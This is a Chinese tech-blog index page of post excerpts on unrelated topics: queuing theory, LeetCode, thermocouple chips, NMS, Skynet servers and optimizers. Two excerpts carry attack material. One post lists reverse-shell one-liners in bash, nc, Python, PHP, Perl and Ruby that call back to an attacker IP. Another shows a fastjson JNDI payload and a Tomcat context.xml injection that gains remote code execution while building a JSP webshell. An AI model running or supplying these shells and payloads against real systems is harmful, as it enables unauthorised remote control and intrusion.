排队论研究内容* 排队论（queuing theory)也称随机服务系统理论，是为研究和解决具有拥挤现象的问题而发展起来的一门应用数学的分支，其研究内容包括三个部分：
性态问题：即研究各种排队系统的概率规律性，主要是研究队长分布、等待时间分布和忙期分布等，包括了瞬态和稳态两种情形。最优化问题
静态最优 &gt;&gt;最优设计
动态最优&gt;&gt;最优运营统计推断问题：判断排队系统的类型 ①一般表示 各个顾客由顾客源（总体）出发，到达服务机构（服务台、服务员）前排队等候接受服务，服务完成后离开。排队结构指队列的数目和排列方式，排队规则和服务规则是说明顾客在排队系统中按怎样的规则、次序接受服务的。 一个排队系统包括
在一定时间内顾客平均到达多少？按什么规律到达（输入过程服从什么分布）？进入系统的顾客按照什么规则排队？服务机构设置多少服务设施？排列形式？服务时间服从什么分布？ 服务机构* 排队系统的（三大）组成和特征* 输入过程 顾客总体：有限，无限。顾客到达方式：单个，成批。顾客到达间隔时间：确定的、随机的。顾客到达的独立性：独立，不独立。输入过程的平稳性：与时间无关（平稳的），与时间有关（非平稳的）。 排队及排队规则 即时制（损失制）等待制 先到先服务：FCFS后到先服务：LCFS随机服务：SIRO优先权服务：PR 队容量：有限，无限；有形，无形。队列数目：单列，多列。 服务机构 服务员数量：无，单个，多个。队列与服务台的组合服务方式：单个顾客，成批顾客。服务时间：确定的，随机的。服务时间和到达间隔时间至少一个是随机的。服务时间分布是平稳的。 排队论的基本分布 排队论中的常见分布：泊松分布、指数分布与爱尔朗分布_Norstc的博客-CSDN博客_erlang分布
排队系统的分类* 运筹学-排队论（学习笔记） - 知乎 (zhihu.com)
一般可以用6个特征来表示一个排队模型，即 X / Y / Z / A / B / C X/Y/Z/A/B/C X/Y/Z/A/B/C
原则
X : X: X: 相继到达的间隔时间的分布，一般为负指数分布
Y : Y: Y:服务时间的分布，一般为负指数分布或者确定性
Z : Z: Z:服务台的数目，1台或者多台
A : A: A:系统客量的限制，系统中是否存在顾客的最大数量限制
B : B: B:顾客源数目，顾客源是否有限
C : C: C:服务规则，先到先服务或者后到先服务等
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b07113e342789d63abce2fa64c246368/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67fe162c3839b25b4565b222edc685b4/" rel="bookmark">
			LeetCode第71场双周赛
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		📒博客首页：崇尚学技术的科班人
🍣今天给大家带来的文章是《LeetCode第71场双周赛》🍣
🍣希望各位小伙伴们能够耐心的读完这篇文章🍣
🙏博主也在学习阶段，如若发现问题，请告知，非常感谢🙏
💗同时也非常感谢各位小伙伴们的支持💗
文章目录 &lt;1&gt; 第一题题目示例提示⭐思路⭐代码实现运行结果 &lt;2&gt; 第二题题目示例提示⭐思路⭐代码实现运行结果 &lt;3&gt; 第三题题目示例提示⭐思路⭐代码实现运行结果 &lt;1&gt; 第一题 题目 拆分数位后四位数字的最小和
给你一个四位 正 整数 num 。请你使用 num 中的 数位 ，将 num 拆成两个新的整数 &gt;new1 和 new2 。new1 和 new2 中可以有 前导 0 ，且 num 中 所有 数位都必须使用。
比方说，给你 num = 2932 ，你拥有的数位包括：两个 2 ，一个 9 和一个 3 。一些可能的[new1, new2] 数对为 [22, 93]，[23, 92]，[223, 9] 和 [2, 329]。 请你返回可以得到的 new1 和 new2 的 最小 和。
示例 示例1： 输入：num = 2932 输出：52 解释：可行的 [new1, new2] 数对为 [29, 23] ，[223, 9] 等等。 最小和为数对 [29, 23] 的和：29 + 23 = 52 。 示例2： 输入：num = 4009 输出：13 解释：可行的 [new1, new2] 数对为 [0, 49] ，[490, 0] 等等。 最小和为数对 [4, 9] 的和：4 + 9 = 13 。 提示 1000 &lt;= num &lt;= 9999 ⭐思路⭐ 思路 这道题是签到题，我的做法就是将每个数位进行分解放置数组中进行排序（因为题目中的数据范围表明其就是一个四位数），然后我们将最大的放置于个位。所以返回结果就是nums[0] * 10 + nums[1] * 10 + nums[2] + nums[3]。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/67fe162c3839b25b4565b222edc685b4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/31cfc6c4b4f3403920bd6a33abefc404/" rel="bookmark">
			热电偶测温专用芯片介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		AD594/AD595
AD594/AD595是带冷端补偿的热电偶集成运放，AD594适用于J型热电偶，AD595适用于K型热电偶。要深入了解请看下面的官方Datasheet介绍。
The AD594/AD595 is a complete instrumentation amplifier and thermocouple cold junction compensator on a monolithic chip. It combines an ice point reference with a precalibrated amplifier to produce a high level (10 mV/°C) output directly from a thermocouple signal. Pin-strapping options allow it to be used as a linear amplifier-compensator or as a switched output setpoint controller using either fixed or remote setpoint control. It can
be used to amplify its compensation voltage directly, thereby converting it to a stand-alone Celsius transducer with a low impedance voltage output.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/31cfc6c4b4f3403920bd6a33abefc404/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0799719309a5b7f79a9b9f09bee35fe6/" rel="bookmark">
			素数的判断
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include&lt;bits/stdc++.h&gt;
using namespace std;
void prime(int n)
{
if(n==1||n==2)
{
cout&lt;&lt;n&lt;&lt;endl;
return ;
}
for(int i=3;i&lt;=n;i++)
{
int t=1;
for(int j=2;j&lt;i;j++)
{
if(i%j==0)
{
t=0;
break;
}
} if(t==1)
{
cout&lt;&lt;i&lt;&lt;endl;
}
} return;
} int main()
{
int n;
cin&gt;&gt;n;
cout&lt;&lt;int(sqrt(19))&lt;&lt;endl;
prime(n);
return 0;
}
也可以求到2根号n之间有没有约数有约数这一个约数小于根号n另一个必定大于根号n，这个可以减小时间复杂度，可以自己思考代码实现
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63b83cafc57fc642adfda2d7db1eda3e/" rel="bookmark">
			非极大值抑制(Non-Maximum Suppression):NMS简介（附详解代码）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		非极大值抑制(Non-Maximum Suppression):NMS简介 非极大值抑制即是NMS算法，在边缘检测、人脸检测、目标检测等广泛应用，同时在不同应用中，具体实现也有其不同，接下来从边缘检测以及目标检测展开叙述。
1. canny算子中的非极大值抑制 Canny算子是边缘检测中的一部分，目的是寻找像素点的局部最大值，抑制其他极大值，将非极大值点对应的灰度值设为0。
在进行非极大值抑制的过程中，首先要判断目标像素点O的灰度值是否在其领域内属于最大，如图1中的红色线条方向为O点的梯度方向，梯度方向垂直于边缘方向，因此，可得最大值存在于红色线条上，同时梯度方向的P,Q两个交点可能会是局部最大值，因此判断O点与P，Q两点的灰度大小，便可得出O点是否为邻域的最大灰度点，倘若O点灰度值小于P，Q任意两点的灰度值，那么即可得出O非局部最大值。
图1. 非极大值判断 事实上，只能得到O点邻域的8个点的值，而P和Q并不在其中，要得到这两个值就需要对P，Q两端的已知灰度进行线性插值，也就是图1中的a1和a2对P进行插值，根据a3和a4对Q进行插值。
canny算子中的非极大值抑制是什么原理？
Canny算子中的非极大值抑制（Non-Maximum Suppression）分析
canny算法（3）——非极大值抑制
2. 目标检测中的非极大值抑制 在目标检测过程中，同一目标位置上会产生大量的候选框，而这些候选框会发生一定程度的重合，因此需要利用非极大值抑制找出最佳的目标边界框，消除冗余的边界框，如图2，3所示：
图2. 多边界框 图3. 最优边界框 图2中存在多个候选框的原因为每个边界框都会存在一个置信度得分，而使用非极大值抑制（NMS）后，便会得到符合目标检测结果的边界框见图3。 1.首先依据置信度得分进行排序；
2.置信度最高的比边界框添加到最终输出列表中，将其从边界框列表中删除；
3.计算所有边界框面积；
4.计算置信度最高的边界框与其它候选框的IoU；
5.删除IoU大于阈值的边界框；
基于python及opencv代码
import cv2 import numpy as np def nms(bounding_boxes, confidence_score, threshold): # 无边界框则返回空列表 if len(bounding_boxes) == 0: return [], [] # 定义边界框 boxes = np.array(bounding_boxes) # 定义边界框坐标 start_x = boxes[:, 0] start_y = boxes[:, 1] end_x = boxes[:, 2] end_y = boxes[:, 3] # 定义边界框置信度得分 score = np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/63b83cafc57fc642adfda2d7db1eda3e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/19f94379d3d8eb5b6ed827fea1bfd42a/" rel="bookmark">
			linux脚本批量解压到同名目录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 批量解压 #! /bin/sh for i in *.zip do k=$i s=${k%.zip*} echo $s unzip $i -d $s done 批量改名 for i in problem* do k=$i s=${k#*problem*} mv $i $s done 将目录下的所有文件名写入文档 for i in * do echo -n "$i," &gt;&gt; a.txt done # 打印出来 # 10022，10023，10024，10027... 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e12744da941b477e5a2bdd991718f61/" rel="bookmark">
			shell的正向和反向
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		正向shell和反向shell
正向shell：控制端主动发起连接去连接被控制端
反向shell：被控制端主动连接控制端
在实战中，大多数采用反向shell，因为正向shell有很多因素导致连接失败，
比如说硬件设备有防火墙，入侵防御系统等，还有网站防火墙，端口占用，权限不足等场景，特别是硬件设备如果你正向连接被防火墙拦截导致打草惊蛇，后期攻击相当繁琐。
反向shell：而被控制端主动向外发送的数据包通常都不会被拦截。
反向shell如下
Linux常见反向shell
bash反弹shell
nc -lvp 4444 bash -i&gt;&amp; /dev/tcp/192.168.11.12/4444 0&gt;&amp;1 nc反弹shell
nc -lvp 4444 nc 192.168.11.12 666 /bin/bash |nc 192.168.11.12 666 nc 192.168.11.12 999 -e /bin/bash Linux python反弹shell
nc -lvp 9999 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.11.12",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' PHP反弹shell
nc -lvp 6666 php -r '$sock=fsockopen("192.168.11.12",6666);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' Perl反弹shell
perl -e 'use Socket; $i="192.168.11.12";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};' ruby反弹shell
nc -lvp 4444 ruby -rsocket -e'f=TCPSocket.open("192.168.11.12",4444).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5e12744da941b477e5a2bdd991718f61/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/615f7576a04f9173827aa437e002db8f/" rel="bookmark">
			【技术年货】字节技术年货篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、参考资料 字节技术年货之实践篇：微服务架构演进、全链路压测、埋点数据治理……
不完整收录：过去一年字节开源的10个项目丨字节技术年货 不完整收录：2021年字节自研的8项“黑科技” | 字节技术年货 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/644ad252e3a558681d83d1614bd1b2d8/" rel="bookmark">
			【Skynet】Skynet项目-球球作战实例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Skynet项目-球球作战实例 一、拓扑结构1.1 各服务功能1.2 消息流程1.3 设计要点 二、目录结构2.1 项目根目录2.2 service目录2.3 lualib目录2.4 luaclib_src目录2.5 luaclib目录2.6 proto目录2.7 storage目录2.8 tools目录2.9 etc目录 三、启动流程四、项目地址 一、拓扑结构 如图3-3，其中圆圈代表服务，圈内文字代表服务类型和编号，比如：”gateway1“代表”gateway“类型的1号服务。
该拓扑结构支持横向拓展（增加物理机）
1.1 各服务功能 服务说明gateway即网关，用于处理客户端连接的服务。客户端会知道所有网关地址（选服列表）。选择连接某个网关（gateway），如果玩家尚未登录，网关会把消息转发给节点内某个login服务，以处理账号校验等操作；如果登陆成功，则会把消息转发给客户端对应的agent服务。一个节点可以开启多个网关以分摊性能login即登录服务，用于处理登录逻辑的服务，比如账号校验。一个节点可以开启多个登录服务以分摊性能agent即代理服务，每个客户端会对应一个代理服务（agent），负责对应角色的数据加载、数据存储、单服逻辑的处理（比如强化装备、成就等）。出于性能考虑，agent必须与它对应的客户端连接（即客户端连接的gateway）处在同一个节点agentmgr即管理代理（agent）的服务，它会记录每个agent所在的节点，避免不同的客户端登录同一账号nodemgr即节点管理，每隔节点会开启一个nodemgr服务，用于管理该节点（新建agent服务）和监控性能scene即场景服务，处理战斗逻辑的服务，每一局游戏由一个场景服务器负责 1.2 消息流程 登录过程：
①：客户端连接某个gateway，然后发送登录协议
②：gateway将登陆协议转发给login
③：如果login校验通过，转发给agentmgr校验
④：agentmgr发现玩家已在线，通知另一客户端agent踢下线
⑤：另一客户端的agent通知gateway和客户端断开socket连接
⑥：agentmgr通知nodemgr新建一个agent服务
⑦：新建一个agent服务
⑧：新建的agent通知login，login再通知gateway告诉玩家登陆成功
游戏过程：
⑨：客户端发消息给gateway，gateway直接转发给对应的agent
1.3 设计要点 1.gateway
这套服务端系统采用传统C++服务器架构方案。gateway只做消息转发，启用gateway服务有以下的好处：
隔离客户端和服务端系统。如果要更改客户端协议（比如改用json协议或者protobuf），仅需更改gateway，不会对系统内部产生影响。预留了断线重连功能，如果客户端断线，仅影响gateway，不影响agent 然而引入gateway意味着客户端消息需经过一层转发，会带来一定的延迟。将同一个客户端连接的gateway、login、agent置于同一节点，有助于减少延迟。
2.agent和scene的关系
agent可以和任意一个scene通信，但跨节点通信的开销比较大。一个节点可以支撑数千名玩家，足以支撑各种段位的匹配，玩家应尽可能地进入同一节点的战斗场景服务器（scene）。
3.agentmgr
agentmgr仅记录agent的状态、处理玩家登录、登出功能，所有对它的访问都以玩家id为索引。它是个单点，但很容易拓展成分布式。
二、目录结构 2.1 项目根目录 etc：存放服务配置的文件夹example：测试用例luaclib：存放一些C模块（.so文件）luaclib_src：存放C模块的源代码（.c、.h）lualib：存放Lua模块service：存放各服务的Lua代码skynet：skynet框架，我们不会改动skynet的任何内容。如果后续skynet有更新，直接替换该文件夹即可proto：存放通信协议文件（.proto）storage：存放数据库协议文件（.proto）tools：存放工具文件start.sh：启动服务的脚本（本质就是./skynet [配置]） 2.2 service目录 admin：类似skynet的debug_console编写的一个”管理控制台“服务，服务器管理者可以通过telnet登入控制台，然后输入指令。如”stop“妥善关闭服务器，把玩家全部踢下线。如”mail“给在线玩家发邮件等。agent：agent服务agentmgr：agentmgr服务gateway：gateway服务login：login服务nodemgr：nodemgr服务scene：scene服务main.lua：main服务是节点启动后第一个被加载的服务，用于启动其他各个服务 2.3 lualib目录 protobuf.lua：protobuf用到的Lua模块代码service.lua：是agent、agentmgr、gateway、login、nodemgr、scene服务的父类。这些服务都继承自service。service里封装了一些skynet的API和一些自有的属性，方便子服务的创建、通信、辨别不同服务类型等，减少代码编写。register.lua：提供一个注册类，用于把模块方法注册进里面，然后通过register模块API取出模块里函数，实现代码简洁，不用再多处维护不同的函数列表extension目录：该目录下存放扩展lua标准库方法的文件。例如./extension/table.lua文件，存放扩展标准库table的函数：如PrintTable()打印表的内容、update()更新表内容，然后把自己实现的方法注册到标准库table表里即可，即table.PrintTable = PrintTable、table.update = update。 2.4 luaclib_src目录 lua-cjson：cjson的源代码，用于json和lua之间的转换。pbc：pbc的源代码，用于protobuf。 lua-cjson下载与编译：
cd luaclib_src	#进入luaclib_src目录 git clone https://github.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/644ad252e3a558681d83d1614bd1b2d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90299072d96a53d8be8fae52af11d503/" rel="bookmark">
			【常见的优化算法介绍】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		常见的优化算法介绍 1. 批量梯度下降算法（batch gradient descent BGD）
每次迭代都需要把所有样本都送入，这样的好处是每次迭代都顾及了全部的样本，做的是全局最优化,但是有可能达到局部最优。
2. 随机梯度下降算法（Stochastic gradient descent SGD）
针对梯度下降算法训练速度过慢的缺点，提出了随机梯度下降算法，随机梯度下降算法算法是从样本中随机抽出一组，训练后按梯度更新一次，然后再抽取一组，再更新一次，在样本量及其大的情况下，可能不用训练完所有的样本就可以获得一个损失值在可接受范围之内的模型了。
#pytorch中的使用 torch.optim.SGD() 3. 小批量梯度性下降（Mini-batch gradient descent MBGD）
SGD相对来说要快很多，但是也有存在问题，由于单个样本的训练可能会带来很多噪声，使得SGD并不是每次迭代都向着整体最优化方向，因此在刚开始训练时可能收敛得很快，但是训练一段时间后就会变得很慢。在此基础上又提出了小批量梯度下降法，它是每次从样本中随机抽取一小批进行训练，而不是一组，这样即保证了效果又保证的速度。
4.动量法
mini-batch SGD算法虽然这种算法能够带来很好的训练速度，但是在到达最优点的时候并不能够总是真正到达最优点，而是在最优点附近徘徊。
另一个缺点就是mini-batch SGD需要我们挑选一个合适的学习率，当我们采用小的学习率的时候，会导致网络在训练的时候收敛太慢；当我们采用大的学习率的时候，会导致在训练过程中优化的幅度跳过函数的范围，也就是可能跳过最优点。我们所希望的仅仅是网络在优化的时候网络的损失函数有一个很好的收敛速度同时又不至于摆动幅度太大。
所以Momentum优化器刚好可以解决我们所面临的问题，它主要是基于梯度的移动指数加权平均，对网络的梯度进行平滑处理的，让梯度的摆动幅度变得更小。
v = 0.8 v + 0.2 ▽ w , ▽ w 表 示 当 前 一 次 的 梯 度 v = 0.8v + 0.2▽w ,▽w 表示当前一次的梯度 v=0.8v+0.2▽w,▽w表示当前一次的梯度
w = w − w − l r ∗ v , l r 表 示 学 习 率 w = w-w - lr*v ,lr表示学习率 w=w−w−lr∗v,lr表示学习率
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/90299072d96a53d8be8fae52af11d503/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7ebf425ff0338aabe7f11248bcd7a7b8/" rel="bookmark">
			jsp新webshell的探索之旅
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		jsp新webshell的探索之旅 题外话 最近更新了新的博客关于本人一些有趣的java的研究会优先更新到新博客（http://y4tacker.github.io/）
简介 这篇文章记录了我从一个小发现到实现RCE，为了实现更短的webshell，在这之间遇到了一些的新问题到解决，再到最终精简得到一个新的jsp五行Payload构成的webshell的过程
发现 在tomcat的扫描中都有对一些配置文件的扫描以及对里面的属性解析赋值的过程，由于之前的一些小发现(这里不多说)，今天下午一个突如其来的crush在我心中出现，我去跟踪了一下解析context.xml的过程
在org.apache.catalina.startup.ContextConfig#contextConfig中，从这里可以看到defaultContextXml要么从标准上下文，要么则是默认值conf/context.xml
接下来在解析阶段，在其中的org.apache.tomcat.util.digester.Digester#startElement引起了我的注意
这里如果匹配到标签Context或Manager则会去调用org.apache.tomcat.util.digester.SetPropertiesRule#begin,而这个函数中取出属性赋值的地方如下
之后通过调用setProperty方法，去调用属性的set方法，具体如下(部分截图)
到了这里一个思路就涌现在我脑中，还记得fastJson的第一个payload吗
{ "@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"ldap://vps/TouchFile", "autoCommit":true } 这不就是都是set的过程
之后我在contenx.xml中加上
&lt;Manager className="com.sun.rowset.JdbcRowSetImpl" dataSourceName="rmi://127.0.0.1/Exploit" autoCommit="true"&gt;&lt;/Manager&gt; 再次启动tomcat，成功弹出了计算器
新的问题 可是这个利用链过程是在tomcat启动的过程啊，要想彻底解决我们还得去看看它是通过什么函数进行解析，以及我们是否能控制呢
在org.apache.catalina.startup.ContextConfig#init中，我们看看关键的步骤
protected void init() { Digester contextDigester = createContextDigester(); contextDigester.getParser(); ---------------- contextConfig(contextDigester); } 可以看到函数contextConfig中传入一个contextDigester对象，这个对象我们也很好得到，虽然这是一个protected修饰的函数，但是里面的过程却都是public修饰的，因此我们直接复制出来即可
继续跟进执行在org.apache.catalina.startup.ContextConfig#contextConfig，最开始我们便提到了要么从标准上下文，要么则是默认值conf/context.xml，那么为了扩展攻击面利用我们肯定选择前者
流程实现构造Webshell 因此，我们再梳理一下上面的利用流程
1.实例化ContextConfig
2.获取StandardContext，添加到ContextConfig的context
3.初始化Digester对象
4.调用ContextConfig的contextConfig函数执行利用过程
当然这里需要加个写文件的函数，我太懒惰了
&lt;%@ page import="org.apache.catalina.startup.ContextConfig" %&gt; &lt;%@ page import="org.apache.tomcat.util.digester.Digester" %&gt; &lt;%@ page import="java.util.List" %&gt; &lt;%@ page import="java.util.HashMap" %&gt; &lt;%@ page import="java.util.ArrayList" %&gt; &lt;%@ page import="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7ebf425ff0338aabe7f11248bcd7a7b8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bdadf35224d3adbe3135061dd954d492/" rel="bookmark">
			C# 分形几何图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		[CommandMethod("FenXingShu")] public void FenXingShu() { Database db = HostApplicationServices.WorkingDatabase; Random k_r = new Random(); int i; double x = 0, y = 0, r, u = 0; List&lt;Entity&gt; ents = new List&lt;Entity&gt;(); for (i = 0; i &lt;= 10000; i++) { r = (int)(k_r.NextDouble() * 100); if (r &lt; 1) { x = 0; y = .16 * y; } if (r &gt;= 1 &amp;&amp; r &lt; 86) { u = .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bdadf35224d3adbe3135061dd954d492/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a44cb48d98e714c0e4c08b7add7c2f46/" rel="bookmark">
			自学java中使用 QueryRunner 出现的Cannot create 问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		java中使用 QueryRunner 出现的Cannot create 问题(仅供自学记载，无任何技术含量）
在自学java途中，我想通过QueryRunner来提高效率，但却出现Cannot create这种问题
问题有可能在domain(javaBean)里的类没有设置无参构造器，导致报错，因为框架里创建对象都是用的无参构造器反射创建。
解决方案：
①.给对应的domain设置无参构造器。 [ 代码： public className(){}; ]
(仅供自学记载，无任何技术含量）
​​​​​​​ ​​​​​​​ ​​​​​​​ ​​​​​​​ ​​​​​​​ ​​​​​​​ ​​​​​​​ ​​​​​​​ ​​​​​​​ ​​​​​​​ ​​​​​​​----------------------2022-02-02
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/057863c3d658b04b54fadc8ad801ed41/" rel="bookmark">
			2022春节过年计划:不确定性中的确定
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先祝各位新年快乐，新的一年，有新的遇见和新的成绩！ 今年因为yq原因，提前回家办公了，不知道这场病灾还能持续多久，但以后可能回家过不了年对很多人来说也是常态了。自从毕业后，每年的年味一年年变淡，不变的是这炮竹声声，大年三十晚上按照惯例，需要去庙里面拜拜菩萨，看着很多善男信女们嘴里振振有词，无乎求财求福，但总感觉钱变多了，幸福却变少了。
今年从到家到离家共待十天，其中有两天是没法正常踏实学习的，一个就是晚上坐火车回家，二就是坐火车离家，状态不行的话，不如聊聊天发发呆。剩余八天的时间里面，至少有一半得忙活过年的事情，所以真实学习的时间和状态并不多，今年不准备像去年一样激进，准备只做一件事，看完两本书就可以了。
2022年是更加血腥的一年，希望自己能够经常去医院检查身体，在平日里多锻炼身体，踏实地看几本书，保证每本书都有收获。
在面对不确定性的时候，唯一确定的就是做好准备，迎接所有的不确定性，加油，2022！
传送门：2021最新测试资料与大厂招聘合集
博主：测试生财（一个不为996而996的测开码农）
座右铭：专注测试开发与自动化运维，努力读书思考写作，为内卷的人生奠定财务自由。
内容范畴：技术提升，职场杂谈，事业发展，阅读写作，投资理财，健康人生。
csdn：公众号-测试生财_CSDN博客-运维&amp;环境,测试不是一点点,踩坑指南领域博主
博客园：公众号-测试生财 - 博客园
51cto：https://blog.51cto.com/14900374
微信公众号：测试生财（定期分享独家内容和资源）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8d8e4e638443fbe12c67acfbc43c400/" rel="bookmark">
			【论文阅读】Deep Neural Networks for Learning Graph Representations | day14，15
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		《Deep Neural Networks for Learning Graph Representations》- (AAAI-16)-2016
文章目录 一、模型1.1解决了两个问题1.2优点 二、背景知识2.1DeepWalk中的未加权图随机采样法2.2 两种从线性结构数据中学习词语表示的线性方法2.2.1Skip-gram with Negative Sampling带负抽样的跳跃图2.2.2 PMI matrix 结合 SVD 使用2.2.3深度神经网络 三、DNGR模型3.1随机冲浪模型3.2优点 提出了一个模型DNGR (deep neural networks for graph representations)，用于加权图的表示学习。通过捕捉图数据的结构信息，基于随即冲浪（而非采样）为每个顶点生成一个低维向量表示。该模型可从理论和经验角度视为良好。 一、模型 1.1解决了两个问题 1.如何更准确、快速获取加权图的图结构信息。
答：设计了一个适用于加权图的随机冲浪模型，可直接生成一个概率共现矩阵。
2.如何更好的构造节点表示的线性结构。
答：PPMI矩阵是图的显式表示矩阵，使用SVD实现维度约简。为了增强模型的鲁棒性，使用了堆叠的去噪自动编码器来学习多层表示。
学习到的表示可以被视为输入特征，这些特征可以被输入到其他任务中，例如无监督聚类和监督分类任务。
1.2优点 1.理论上：深度神经网络（随机冲浪模型）比传统线性降维方法（例如基于抽样），更能够捕获图数据的非线性信息。
2.实践证明：新模型能够更好地学习加权图的低维顶点表示，可以捕获有意义的图的语义、关系和结构信息。
二、背景知识 2.1DeepWalk中的未加权图随机采样法 以说明将顶点表示转换为线性表示的可行性。
在一个未加权的图中，边权值表示两个顶点之间是否存在关系，因此是二进制的。相反，加权图中的边权值是实数，表示两个顶点之间的关联度。虽然权图中的边权可以是负的，但本文中只考虑非负权。
目的：试图获取图G的深层结构信息的矩阵R。
方法：
DeepWalk提供了一种称为截断随机漫步，将未加权的图数据转换为表示图顶点之间关系的“线性序列”。
所提出的随机游动是一种适用于非加权图的均匀抽样方法。
1.他们首先从图中随机选择一个顶点v1，把它标记为当前的顶点，然后从当前顶点v1的所有邻居中随机选择下一个顶点v2。
2.之后，将新选择的顶点v2标记为当前的顶点，并重复这样的顶点采样过程。
3.当一个序列中的顶点数量达到一个预先设定的漫步长度η时，算法终止。
在重复上述过程γ次(称为总行走)后，收集线性序列块。
2.2 两种从线性结构数据中学习词语表示的线性方法 2.2.1Skip-gram with Negative Sampling带负抽样的跳跃图 词语表示方法分为基于神经网络嵌入和矩阵分解两种。之前提出的skip-gram模型是一种学习单词表征的方法。其改进方法分为负抽样(SGNS)和分层softmax，在本文中使用负抽样方法。
2.2.2 PMI matrix 结合 SVD 使用 词语表示学习方法的另一种是基于矩阵分解技术。这种方法基于全局共现次数的统计来学习表示，在某些预测任务中优于基于独立局部上下文窗口的神经网络方法。
矩阵分解方法的一个例子是：超空间模拟分析(Lund和Burgess, 1996)，它分解一个词-词共现矩阵以产生词表示。
这种方法和相关方法的一个主要缺点是，语义值相对较小的频繁单词(如停止词)会对生成的单词表示产生不成比例的影响。
Church和Hanks的点态互信息(PMI)矩阵(Church和Hanks 1990年)可以解决这个问题。并且，如果将每个负数赋值为0，以形成PPMI矩阵，可以提高词语表示的效果。虽然PPMI矩阵是一个高维矩阵，但是使用截断的SVD方法进行降维(Eckart和Young 1936)可以得到矩阵的最优分解。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b8d8e4e638443fbe12c67acfbc43c400/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc9a539903e0a9a6baa35c32bfe51caf/" rel="bookmark">
			C&#43;&#43;编译期分支选择相关技术
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
